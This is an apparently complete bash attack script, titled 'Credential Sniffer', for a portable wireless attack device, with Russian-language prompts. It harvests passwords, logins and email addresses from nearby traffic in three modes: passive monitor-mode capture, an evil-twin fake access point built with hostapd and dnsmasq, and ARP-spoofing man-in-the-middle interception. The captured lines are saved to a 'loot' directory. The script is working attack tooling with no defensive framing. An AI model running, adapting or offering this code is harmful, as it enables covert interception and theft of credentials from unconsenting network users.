#!/bin/bash
# Title: Credential Sniffer
# Author: bad-antics
# Description: Пассивный захват учётных данных из сетевого трафика
# Category: nullsec/capture

# ---------- FIX: Correct PATH and UI fallbacks ----------
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH

# Fallback for UI functions (in case they are missing when run from Virtual Pager)
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Press Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Done"; }
command -v TEXT_PICKER >/dev/null 2>&1 || TEXT_PICKER() { echo "$1"; read -p "Value: " val; echo "$val"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Choice: " choice; echo "${choice:-$2}"; }

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

# ---------- Check required tools ----------
MISSING=""
for tool in tcpdump strings; do
    command -v $tool >/dev/null 2>&1 || MISSING="$MISSING $tool"
done

case $SNIFF_MODE in
    2) command -v hostapd >/dev/null 2>&1 || MISSING="$MISSING hostapd"
       command -v dnsmasq >/dev/null 2>&1 || MISSING="$MISSING dnsmasq" ;;
    3) command -v arpspoof >/dev/null 2>&1 || MISSING="$MISSING arpspoof" ;;
esac

if [ -n "$MISSING" ]; then
    ERROR_DIALOG "Отсутствуют утилиты:$MISSING\n\nУстановите их через\nopkg install <название>"
    exit 1
fi

PROMPT "СНИФФЕР УЧЕТОК

Пассивно собирает
учетные данные из:

- HTTP форм
- FTP логинов
- SMTP/POP/IMAP
- Telnet сессий

Нажмите ОК для продолжения."

INTERFACE="$IFACE"

PROMPT "РЕЖИМ СНИФФИНГА:

1. Монитор (пассивно)
2. Evil Twin + Сниф
3. ARP Spoof + Сниф

Режим 1 = скрытный
Режим 2/3 = активный

Выберите режим."

SNIFF_MODE=$(NUMBER_PICKER "Режим (1-3):" 1)

LOOT_DIR="/mmc/nullsec/creds"
mkdir -p "$LOOT_DIR"
LOOT_FILE="$LOOT_DIR/creds_$(date +%Y%m%d_%H%M%S).txt"

echo "Журнал сниффера учетных данных" > "$LOOT_FILE"
echo "Дата: $(date)" >> "$LOOT_FILE"
echo "Режим: $SNIFF_MODE" >> "$LOOT_FILE"
echo "---" >> "$LOOT_FILE"

DURATION=$(NUMBER_PICKER "Длительность (мин):" 5)
DURATION_SEC=$((DURATION * 60))

case $SNIFF_MODE in
    1) # Passive monitor
        # Create monitor interface
        MON_IF="${INTERFACE}mon"
        iw dev $INTERFACE interface add $MON_IF type monitor 2>/dev/null
        ifconfig $MON_IF up 2>/dev/null
        if [ ! -d "/sys/class/net/$MON_IF" ]; then
            ERROR_DIALOG "Не удалось создать мониторный интерфейс"
            exit 1
        fi
        
        LOG "Пассивный сниффинг..."
        SPINNER_START "Сниффинг трафика (${DURATION} мин)..."
        
        # Capture packets with credential patterns
        timeout $DURATION_SEC tcpdump -i $MON_IF -w "$LOOT_DIR/capture_$$.pcap" >/dev/null 2>&1 &
        TCPDUMP_PID=$!
        
        sleep $DURATION_SEC
        kill $TCPDUMP_PID 2>/dev/null
        
        SPINNER_STOP
        
        # Parse for creds
        if [ -f "$LOOT_DIR/capture_$$.pcap" ]; then
            strings "$LOOT_DIR/capture_$$.pcap" | grep -iE 'pass=|password=|pwd=|user=|login=|email=' >> "$LOOT_FILE"
            CRED_COUNT=$(wc -l < "$LOOT_FILE")
            PROMPT "СНИФФИНГ ЗАВЕРШЕН

Собрано за ${DURATION} мин
Найдено соответствий: $((CRED_COUNT - 4))

PCAP сохранен: $LOOT_DIR/capture_$$.pcap
Лог: $LOOT_FILE

Нажмите ОК для выхода."
            rm -f "$LOOT_DIR/capture_$$.pcap"
        else
            ERROR_DIALOG "Не удалось создать pcap файл"
        fi
        ;;
        
    2) # Evil Twin mode
        PROMPT "РЕЖИМ EVIL TWIN

Создаст фальшивую точку доступа
и будет сниффить весь трафик.

Введите SSID цели."
        
        TARGET_SSID=$(TEXT_PICKER "SSID для клонирования:" "Free_WiFi")
        
        # Create hostapd config
        cat > /tmp/hostapd_sniff.conf << HOSTAPD_EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
channel=6
hw_mode=g
HOSTAPD_EOF
        
        LOG "Запуск Evil Twin..."
        SPINNER_START "Запуск злого AP и сниффера (${DURATION} мин)..."
        
        hostapd /tmp/hostapd_sniff.conf >/dev/null 2>&1 &
        HOSTAPD_PID=$!
        
        sleep 2
        
        # Start dhcp
        dnsmasq --interface=$INTERFACE --dhcp-range=192.168.4.2,192.168.4.100,12h --no-daemon >/dev/null 2>&1 &
        DNSMASQ_PID=$!
        
        # Sniff
        tcpdump -i $INTERFACE -w "$LOOT_DIR/eviltwin_$$.pcap" >/dev/null 2>&1 &
        TCPDUMP_PID=$!
        
        sleep $DURATION_SEC
        
        kill $TCPDUMP_PID $HOSTAPD_PID $DNSMASQ_PID 2>/dev/null
        SPINNER_STOP
        
        # Parse
        strings "$LOOT_DIR/eviltwin_$$.pcap" | grep -iE 'pass|user|login|email' >> "$LOOT_FILE"
        PROMPT "EVIL TWIN ЗАВЕРШЕН

Длительность: ${DURATION} мин
SSID: $TARGET_SSID

Лог: $LOOT_FILE
PCAP: $LOOT_DIR/eviltwin_$$.pcap

Нажмите ОК для выхода."
        ;;
        
    3) # ARP Spoof mode
        PROMPT "РЕЖИМ ARP SPOOF

Требуется подключение
к целевой сети.

Введите IP шлюза."
        
        GATEWAY=$(TEXT_PICKER "IP шлюза:" "192.168.1.1")
        TARGET_IP=$(TEXT_PICKER "IP цели (или ALL):" "ALL")
        
        LOG "Запуск ARP подмены..."
        SPINNER_START "ARP-подмена и сниффинг (${DURATION} мин)..."
        
        echo 1 > /proc/sys/net/ipv4/ip_forward
        
        if [ "$TARGET_IP" = "ALL" ]; then
            arpspoof -i $INTERFACE -t $GATEWAY >/dev/null 2>&1 &
        else
            arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY >/dev/null 2>&1 &
            arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP >/dev/null 2>&1 &
        fi
        ARPSPOOF_PID=$!
        
        tcpdump -i $INTERFACE -w "$LOOT_DIR/arpspoof_$$.pcap" port 80 or port 21 or port 23 or port 110 or port 143 >/dev/null 2>&1 &
        TCPDUMP_PID=$!
        
        sleep $DURATION_SEC
        
        kill $TCPDUMP_PID 2>/dev/null
        killall arpspoof 2>/dev/null
        echo 0 > /proc/sys/net/ipv4/ip_forward
        
        SPINNER_STOP
        
        strings "$LOOT_DIR/arpspoof_$$.pcap" | grep -iE 'pass|user|login' >> "$LOOT_FILE"
        PROMPT "ARP ПОДМЕНА ЗАВЕРШЕНА

Длительность: ${DURATION} мин
Шлюз: $GATEWAY

Лог: $LOOT_FILE
PCAP: $LOOT_DIR/arpspoof_$$.pcap

Нажмите ОК для выхода."
        ;;
esac

exit 0
